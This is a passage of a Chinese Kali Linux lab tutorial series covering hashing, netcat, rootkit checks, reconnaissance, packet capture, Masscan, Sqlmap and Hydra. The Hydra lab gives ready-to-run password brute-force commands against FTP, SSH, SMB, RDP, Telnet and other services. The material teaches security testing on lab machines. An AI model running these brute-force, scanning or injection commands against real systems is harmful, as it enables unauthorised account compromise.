<p>了解数据取证工具hashdeep工具的使用</p>
<h2 id="实验步骤-9"><a href="#实验步骤-9" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在数据取证中，通常需要验证文件的哈希值，以判断文件是否已知好文件，或者文件是否被修改过。Kali Linux提供专用工具hashdeep。该工具的早期版本名称为md5deep。该工具可以批量计算文件的哈希值，并和哈希值列表进行比对。该工具支持多种哈希算法，可以避免哈希碰撞问题。为了满足不同任务的需要，hashdeep提供多种检查模式，如审计模式、正向模式、反向模式。同时，该工具支持大小写不敏感和UTF编码， 以满足Windows文件系统分析需要。</p>
</li>
<li><p>直接启动软件：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashdeep –h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>直接生成本地文件hash值：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 打印相对文件名而不是绝对文件名
hashdeep –l ../*

# 打印hash值到本地文件
hashdeep –r test.txt &gt; hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>根据已知的hash值文件进行hash校验，如果一样即通过，如果不一样即审核不通过：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashdeep -r -a hash.txt test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>了解了hashdeep工具，以后在下载文件时，可以通过hashdeep比对文件的hash是否一致来保障文件的安全性。</p>
<h1 id="实验-21-NC端口通信实验"><a href="#实验-21-NC端口通信实验" class="headerlink" title="实验 21 NC端口通信实验"></a>实验 21 NC端口通信实验</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用NC工具和centos进行通信，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2016<br>centos 6.9</p>
<p><strong>实验工具</strong></p>
<p>NC</p>
<p><strong>实验目的</strong></p>
<p>Nc是netcat的简写，有着网络界的瑞士军刀，因为它短小精悍、功能实用，是一款简单可靠的网络工具，学习它的基本使用</p>
<h2 id="实验步骤-10"><a href="#实验步骤-10" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在kali虚拟机上测试与靶机的连通性：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.129 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机centos上使用nc开启服务端口：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc -l 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在kali上使用nmap对靶机进行端口扫描，发现9999端口是开放状态：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p1-65535 192.168.127.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机上使用telnet进行测试9999端口是否能访问：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">telnet 192.168.127.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在kali上使用nc语句和靶机通信：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc 192.168.127.129 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在kali上输入语句的同时在靶机上也会进行实时显示：</p>
 <pre class="line-numbers language-none"><code class="language-none">My name is test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在centos上进行查看发现两者一样的显示。</p>
</li>
<li><p>在靶机使用nc开启udp端口：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc -ul 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>开启tcp时可以用telnet进行测试端口是否开启，但开启udp端口时，telnet却不能进行检测，此刻就需要使用到nc的udp端口检测语句：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc -vuz 192.168.163.127.129 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握kali和centos使用NC进行通信的实验。</p>
<h1 id="实验-22-系统检查-Chkrootkit"><a href="#实验-22-系统检查-Chkrootkit" class="headerlink" title="实验 22 系统检查-Chkrootkit"></a>实验 22 系统检查-Chkrootkit</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Chkrootkit工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2018</p>
<p><strong>实验工具</strong></p>
<p>chkrootkit</p>
<p><strong>实验目的</strong></p>
<p>掌握chkrootkit工具的使用</p>
<h2 id="实验步骤-11"><a href="#实验步骤-11" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>chkrootkit是用来监测rootkit是否被安装到当前系统中的工具：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chkrootkit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 如果发现有异常，会报出“INFECTED”字样。</p>
</li>
<li><p>查看其它命令：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chkrootkit –h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>跳过NFS挂载目录进行检测：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chkrootkit -n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看chkrootkit版本号：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chkrootkit –V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>尝试升级chkrootkit来检测本机是否存在疑问的文件。</p>
<h1 id="实验-23-信息收集-Dmitry"><a href="#实验-23-信息收集-Dmitry" class="headerlink" title="实验 23 信息收集-Dmitry"></a>实验 23 信息收集-Dmitry</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Dmitry工具，为避免在部署时候出现什么问题，小明首先在自己的</p>
<p>虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2018 攻击机<br>windows 7 靶机 192.168.163.147</p>
<p><strong>实验工具</strong></p>
<p>dmitry</p>
<p><strong>实验目的</strong></p>
<p>掌握信息收集工具dmitry的使用</p>
<h2 id="实验步骤-12"><a href="#实验步骤-12" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>直接在终端中启动工具：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>对主机进行端口扫描：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry –p 192.168.163.147<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 将输出保存到%host.txt或由-o文件指定的文件：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry –p 192.168.163.147 –o test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>扫描端口同时读取从扫描端口接收的banner：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry – p 192.168.163.147 –b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>对主机的域名执行whois查找（需要联网操作）：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry – w baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在主机上检索Netcraft.com信息（需要联网操作）：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry – n baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>执行搜索可能的子域（需要联网操作）：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry – s baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>执行搜索可能的电子邮件地址（需要联网操作）：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dmitry – e baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>思考在Dmitry工具中如果探测内网主机是否需要联网。</p>
<h1 id="实验-24-信息收集-Netdiscover"><a href="#实验-24-信息收集-Netdiscover" class="headerlink" title="实验 24 信息收集-Netdiscover"></a>实验 24 信息收集-Netdiscover</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Netdiscover工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2016</p>
<p><strong>实验工具</strong></p>
<p>netdiscover</p>
<p><strong>实验目的</strong></p>
<p>了解netdiscover工具的使用</p>
<h2 id="实验步骤-13"><a href="#实验步骤-13" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>查看帮助：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover –h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>扫描本地网卡设备：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover –i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>发送每个arp请求的次数，测试具有丢包的网络：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover –c 192.168.21.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>扫描给定范围的主机：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover –r 192.168.21.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用被动模式，只进行嗅探：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover –p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握Netdiscover的嗅探模式，在特定地方有奇效。</p>
<h1 id="实验25-NC传输文件实验"><a href="#实验25-NC传输文件实验" class="headerlink" title="实验25 NC传输文件实验"></a>实验25 NC传输文件实验</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用NC工具和centos进行文件传输实验，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2016<br>centos 6.9</p>
<p><strong>实验工具</strong></p>
<p>NC</p>
<p><strong>实验目的</strong></p>
<p>Nc是netcat的简写，有着网络界的瑞士军刀，因为它短小精悍、功能实用，是一款简单可靠的网络工具，使用nc进行文件传输</p>
<h2 id="实验步骤-14"><a href="#实验步骤-14" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在kali虚拟机上测试与靶机的连通性：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.129 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在kali里面新建一个ceshi.txt文件并查看：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo "this is test" &gt; ceshi.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机centos上使用nc监听端口9999，接受到的所有数据都写到test文件里：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc -l 9999 &gt; test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在kali上面使用nc把本地的ceshi文件发送给靶机：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc 192.168.127.129 9999 &lt; ceshi.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机上查看是否有文件生成（如果靶机接受文件不会自动停止，那就使用<code>ctrl+c</code>中止文件接受语句）：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机上查看传输过来的文件看内容是否一致：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握kali和centos使用NC传输文件的操作。</p>
<h1 id="实验-26-抓包工具–Netsniff-ng"><a href="#实验-26-抓包工具–Netsniff-ng" class="headerlink" title="实验 26 抓包工具–Netsniff-ng"></a>实验 26 抓包工具–Netsniff-ng</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用<br>netsniff-ng工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环<br>境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2018</p>
<p><strong>实验工具</strong></p>
<p>netsniff-ng</p>
<p><strong>实验目的</strong></p>
<p>掌握netsniff-ng工具使用</p>
<h2 id="实验步骤-15"><a href="#实验步骤-15" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><strong>抓取TCP或者UDP协议报文保存到dump.pcap</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsniff-ng --in eth0 --out dump.pcap tcp or udp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li><strong>直接打开会出现乱码，需要结合其他分析工具进行分析数据包</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">capinfo dump.pcap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="3">
<li><strong>测试网卡最高传输速率，方法是先用trafgen产生traffic让网卡满负荷，再用netsniff-ng抓包分析</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsniff-ng -i eth0 - o /dev/shm/c1.pcap -s -n 1000000 -b 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="4">
<li><strong>分析抓包的数据包</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">capinfos /dev/shm/c1.pcap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="实验总结-6"><a href="#实验总结-6" class="headerlink" title="实验总结"></a>实验总结</h2><p>对比Netsniff-ng和Wireshark的差异性在那。</p>
<h1 id="实验27-Hash算法之MD5"><a href="#实验27-Hash算法之MD5" class="headerlink" title="实验27 Hash算法之MD5"></a>实验27 Hash算法之MD5</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用<br>MD5工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2018</p>
<p><strong>实验工具</strong></p>
<p>md5sum</p>
<p><strong>实验目的</strong></p>
<p>掌握通过md5sum的使用和对比md5的HASH值</p>
<h2 id="实验步骤-16"><a href="#实验步骤-16" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><strong>计算一个新建文件test.txt的md5值</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5sum test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li><strong>修改文件中内容再重新计算md5值，对比之下发现md5变了</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5sum test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="3">
<li><strong>通过已知的md5值跟文件的md5值进行对比</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5sum –c md5.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="实验总结-7"><a href="#实验总结-7" class="headerlink" title="实验总结"></a>实验总结</h2><p>掌握kali自带的MD5计算小工具的使用</p>
<h1 id="实验28-HASH算法之SHA"><a href="#实验28-HASH算法之SHA" class="headerlink" title="实验28 HASH算法之SHA"></a>实验28 HASH算法之SHA</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用SHA工具，为<br>避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2018</p>
<p><strong>实验工具</strong></p>
<p>shasum</p>
<p><strong>实验目的</strong></p>
<p>掌握shasum工具等使用和对比文件HASH值</p>
<h2 id="实验步骤-17"><a href="#实验步骤-17" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><strong>直接输出test.txt的SHA值</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shasum test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li><strong>将sha1值输出到sha1.txt中</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sha1sum test.txt &gt; sha1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="3">
<li><strong>通过已知的sha1对文件的完整性进行比对</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sha1sum –c sha1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="实验总结-8"><a href="#实验总结-8" class="headerlink" title="实验总结"></a>实验总结</h2><p>利用SHA1来快速比对文件的hash值是否发生变化</p>
<h1 id="实验-29-黑客安防工具-Hydra"><a href="#实验-29-黑客安防工具-Hydra" class="headerlink" title="实验 29 黑客安防工具-Hydra"></a>实验 29 黑客安防工具-Hydra</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Hydra工具，为<br>避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2016<br>windows 7</p>
<p><strong>实验工具</strong></p>
<p>hydra</p>
<p><strong>实验目的</strong></p>
<p>了解hydra并掌握使用hydra工具</p>
<h2 id="实验步骤-18"><a href="#实验步骤-18" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><strong>在终端输入hydra，可以看到相关使用语法</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li><p><strong>参数列表:</strong></p>
<ul>
<li>-R 恢复上次停止的破解进度，继续破解</li>
<li>-S 使用SSL连接</li>
<li>-s PORT if the service is on a different default port, define it here</li>
<li>-s 端口号 在这里自定义要破解的端口号(替代默认端口)</li>
<li>-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE</li>
<li>-l 登录名 或者 - L 字典 使用登录名 或者 从字典中获取登录名单</li>
<li>-p PASS or -P FILE try password PASS, or load several passwords from FILE</li>
<li>-p 密码 或者 - P 字典 使用单个密码 或者 从字典中获取密码列表</li>
<li>-e ns 附加选项,n 是表示空密码,s 尝试使用密码进行破解</li>
<li>-C FILE colon-separated “login:pass” format, instead of -L/-P options</li>
<li>-C 文件 使用冒号分割格式 例如 “登录名:密码”来代替-L/-P参数</li>
<li>-M FILE server list for parallel attacks, one entry per line</li>
<li>-M 文件 服务器列表(译者:ip列表),一行一条</li>
<li>-o FILE write found login/password pairs to FILE instead of stdout</li>
<li>-o 文件 将找到的密码写在文件里面 以此代替输出到屏幕上</li>
<li>-f 在使用-M参数以后 找到第一对登录名或者密码的时候中止破解</li>
<li>-t TASKS run TASKS number of connects in parallel (default: 16)</li>
<li>-t 计划任务 同时运行几个任务(默认是</li>
</ul>
</li>
</ol>
<p>: 16)</p>
<ul>
<li>-w TIME defines the max wait time in seconds for responses (default: 30)</li>
<li>-w 时间 定义超时时间秒数(默认是: 30)</li>
<li>-vV 详细显示用户名或者密码的破解过程</li>
</ul>
<ol start="3">
<li><strong>用法</strong></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra 可选参数+必选参数+攻击地址+攻击类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="4">
<li><p><strong>举例：使用hydra尝试爆破FTP服务器账号密码</strong></p>
<ul>
<li>先在kali终端中尝试登录FTP服务器，看服务是否正常</li>
</ul>
</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp &lt;target_ip&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看本地的字典文件</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat /usr/share/wordlists/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>加载本地的密码文件来进行爆破</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://&lt;target_ip&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>使用爆破的密码进行登录</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp &lt;target_ip&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="5">
<li><p><strong>其它的一些破解类型</strong></p>
<ul>
<li>使用hydra破解SSH的密码</li>
</ul>
</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>破解HTTPS</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -m /index.php -l username -P pass.txt IP https<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>破解Teamspeak</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l 用户名 - P 密码字典 - s 端口号 - vV ip teamspeak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>破解Cisco</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -P pass.txt IP cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>破解SMB</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l administrator -P pass.txt IP smb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>破解POP3</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l muts -P pass.txt my.pop3.mail pop3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>破解RDP</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra IP rdp -l administrator -P pass.txt -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>破解HTTP-Proxy</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l admin -P pass.txt http-proxy://10.36.16.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>破解Telnet</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra IP telnet -l 用户 - P 密码字典 - t 32 -s 23 -e ns -f –V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="实验总结-9"><a href="#实验总结-9" class="headerlink" title="实验总结"></a>实验总结</h2><p>掌握使用Hydra来爆破常见的服务</p>
<h1 id="实验-30-黑客安防工具-Masscan"><a href="#实验-30-黑客安防工具-Masscan" class="headerlink" title="实验 30 黑客安防工具-Masscan"></a>实验 30 黑客安防工具-Masscan</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Masscan工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<ul>
<li>Kali 2016</li>
<li>Windows 7</li>
</ul>
<p><strong>实验工具</strong></p>
<ul>
<li>Masscan</li>
</ul>
<p><strong>实验目的</strong></p>
<p>了解掌握masscan工具的使用和语法</p>
<p><strong>实验步骤</strong></p>
<h2 id="Masscan的基本使用"><a href="#Masscan的基本使用" class="headerlink" title="Masscan的基本使用"></a>Masscan的基本使用</h2><ol>
<li><p>在终端输入以下命令启动Masscan：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>详细参数含义：</p>
<ul>
<li><code>-p</code> 指定端口进行扫描</li>
<li><code>--banners</code> 获取banner信息,支持少量的协议</li>
<li><code>--rate</code> 指定发包的速率</li>
<li><code>-c, --conf</code> 读取配置文件进行扫描</li>
<li><code>--echo</code> 将当前的配置重定向到一个配置文件中</li>
<li><code>-e, --adapter</code> 指定用来发包的网卡接口名称</li>
<li><code>--adapter-ip</code> 指定发包的IP地址</li>
<li><code>--adapter-port</code> 指定发包的源端口</li>
<li><code>--adapter-mac</code> 指定发包的源MAC地址</li>
<li><code>--router-mac</code> 指定网关的MAC地址</li>
<li><code>--exclude</code> IP地址范围黑名单，防止masscan扫描</li>
<li><code>--excludefile</code> 指定IP地址范围黑名单文件</li>
<li><code>--includefile, -iL</code> 读取一个范围列表进行扫描</li>
<li><code>--ping</code> 扫描应该包含ICMP回应请求</li>
<li><code>--append-output</code> 以附加的形式输出到文件</li>
<li><code>--iflist</code> 列出可用的网络接口，然后退出</li>
<li><code>--retries</code> 发送重试的次数，以1秒为间隔</li>
<li><code>--nmap</code> 打印与nmap兼容的相关信息</li>
<li><code>--http-user-agent</code> 设置user-agent字段的值</li>
<li><code>--show [open,close]</code> 告诉要显示的端口状态，默认是显示开放端口</li>
<li><code>--noshow [open,close]</code> 禁用端口状态显示</li>
<li><code>--pcap</code> 将接收到的数据包以libpcap格式存储</li>
<li><code>--regress</code> 运行回归测试，测试扫描器是否正常运行</li>
<li><code>--ttl</code> 指定传出数据包的TTL值，默认为255</li>
<li><code>--wait</code> 指定发送完包之后的等待时间，默认为10秒</li>
<li><code>--offline</code> 没有实际的发包，主要用来测试开销</li>
<li><code>-sL</code> 不执行扫描，主要是生成一个随机地址列表</li>
<li><code>--readscan</code> 读取从-oB生成的二进制文件，可以转化为XML或者JSON格式</li>
<li><code>--connection-timeout</code> 抓取banners时指定保持TCP连接的最大秒数，默认是30秒</li>
</ul>
</li>
<li><p>示例命令：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan –p21,80,81,8080 192.168.163.0/24 --rate=10000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>扫描指定21, 80, 81, 8080端口的192.168.163.0网段，以每秒10000个包的速率。</p>
</li>
</ol>
<h2 id="扫描指定IP文件中的地址"><a href="#扫描指定IP文件中的地址" class="headerlink" title="扫描指定IP文件中的地址"></a>扫描指定IP文件中的地址</h2><p>IP地址范围有三种有效格式：</p>
<ol>
<li><p>单独的IPv4地址</p>
</li>
<li><p>类似”10.0.0.1-10.0.0.233”的范围地址</p>
</li>
<li><p>CIDR地址，类似于”0.0.0.0/0”，多个目标可以用逗号隔开</p>
</li>
<li><p>扫描ip.txt中IP从1-1000端口并获取banner信息，发包速率为10000：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan -p1-1000 --rate=10000 --banners -iL ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握Masscan扫描工具的使用，对比其它的扫描软件的优势所在。</p>
<h1 id="实验-31-注入工具-Sqlmap"><a href="#实验-31-注入工具-Sqlmap" class="headerlink" title="实验 31 注入工具-Sqlmap"></a>实验 31 注入工具-Sqlmap</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Sqlmap工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机 Kali 2016<br>靶机 Windows 7 + mysqltest</p>
<p><strong>实验工具</strong></p>
<p>Sqlmap</p>
<p><strong>实验目的</strong></p>
<p>掌握sqlmap软件用法</p>
<p><strong>实验步骤</strong></p>
<h2 id="使用Sqlmap进行SQL注入攻击"><a href="#使用Sqlmap进行SQL注入攻击" class="headerlink" title="使用Sqlmap进行SQL注入攻击"></a>使用Sqlmap进行SQL注入攻击</h2><ol>
<li><p>访问简易测试网页：<a href="http://192.168.163.134/mysqltest/mysqltest/index.php?age=25">http://192.168.163.134/mysqltest/mysqltest/index.php?age=25</a></p>
</li>
<li><p>在终端中启动sqlmap：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用sqlmap检测URL是否存在注入：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u "http://192.168.163.134/mysqltest/mysqltest/index.php?age=25"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>如果存在注入，使用参数<code>--tables</code>列出表名：</p>
